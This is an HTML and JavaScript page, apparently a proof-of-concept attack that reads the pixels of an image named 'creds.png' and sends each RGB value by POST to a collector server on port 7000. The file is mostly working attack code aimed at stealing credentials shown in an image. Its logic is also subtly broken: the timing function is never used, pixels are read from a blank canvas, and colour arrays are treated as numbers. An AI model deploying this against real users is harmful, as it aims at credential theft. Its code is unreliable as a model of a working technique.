<!doctype html>
<html>
<head>
	<meta charset='utf-8'>
	<style>
	.big {
		width: calc(349px * 3);
		height: calc(26px * 3);
		/* disable anti-aliasing */
		image-rendering: pixelated;
		image-rendering: optimizeSpeed;
	}

	#scratch { display: none; }
	#heatmap { background: #ffb6c1; }
	</style>
	<script>
	let Heatmap = null
	let ScratchContext = null

	const Width = 349
	const Height = 26

	const Iters = 200

	// Fonction qui obtient la couleur RGB du pixel à la position (x, y)
function getPixelColor(image, x, y) {
    let pixel = ScratchContext.getImageData(x, y, 1, 1).data;
    // Retourne le RGB comme un tableau [r, g, b]
    return [pixel[0], pixel[1], pixel[2]];
}

function zeroDelay() {
  return new Promise(resolve => setTimeout(resolve, 0))
}

async function timePixel(image, x, y) {
  let startTime = performance.now()
  for (let j = 0; j < Iters; j++) {
    ScratchContext.drawImage(image, x, y, 1, 1, 0, 0, 1024, 1024)
  }
  await zeroDelay()
  let endTime = performance.now()

  const duration = endTime - startTime
  return duration
}

// Fonction pour envoyer les données RGB à un serveur via POST
async function sendPixelData(x, y, rgb) {
    // Envoie les données RGB au serveur distant
    await fetch("http://127.0.0.1:7000", {
        method: "POST",
        body: JSON.stringify({ x, y, rgb }),
        headers: { "Content-Type": "application/json" }
    })
}

function drawHeatmap(heatmap) {
  let min = Math.min(...heatmap.map(l => Math.min(...l)))
  let max = Math.max(...heatmap.map(l => Math.max(...l)))

  Heatmap.clearRect(0, 0, Width, Height)

  for (let x = 0; x < heatmap.length; x++) {
    for (let y = 0; y < heatmap[x].length; y++) {
      let color = Math.round(255 * (max - heatmap[x][y]) / (max - min))
      Heatmap.fillStyle = `rgb(${color}, ${color}, ${color})`
      Heatmap.fillRect(x, y, 1, 1)
    }
  }
}

async function recoverImage(image) {
  /* the first couple of measurements are always higher
     than they're supposed to be because some interpreter
     optimizations haven't kicked in yet, so we "warm up"
     the interpreter by throwing away 5 measurements. */
  for (let i = 0; i < 5; i++) {
    await timePixel(image, 0, 0)
  }

  let pixels = []

  for (let x = 0; x < Width; x++) {
    let col = []
    for (let y = 0; y < Height; y++) {
      // Récupérer la couleur RGB du pixel à chaque (x, y)
      let rgb = getPixelColor(image, x, y);

      // Envoie des données RGB au serveur via POST
      await sendPixelData(x, y, rgb);
      
      col.push(rgb);
      drawHeatmap(pixels.concat([col]));
    }
    pixels.push(col)
  }

  drawHeatmap(pixels)
}

function init() {
  ScratchContext = document.getElementById('scratch').getContext('2d')
  ScratchContext.imageSmoothingEnabled = false

  Heatmap = document.getElementById('heatmap').getContext('2d')
  Heatmap.imageSmoothingEnabled = false

  recoverImage(document.getElementById('target'))
}
	</script>
</head>
<body onload='init()'>
	<p>this is what the target image looks like:</p>
	<img
		id='target'
		src='http://127.0.0.1/creds.png'
		class='big'
	>
	<p>this is our reconstruction:</p>
	<canvas id='heatmap' class='big' width=349 height=26></canvas>
	<canvas id='scratch' width=1024 height=1024></canvas>
</body>
</html>
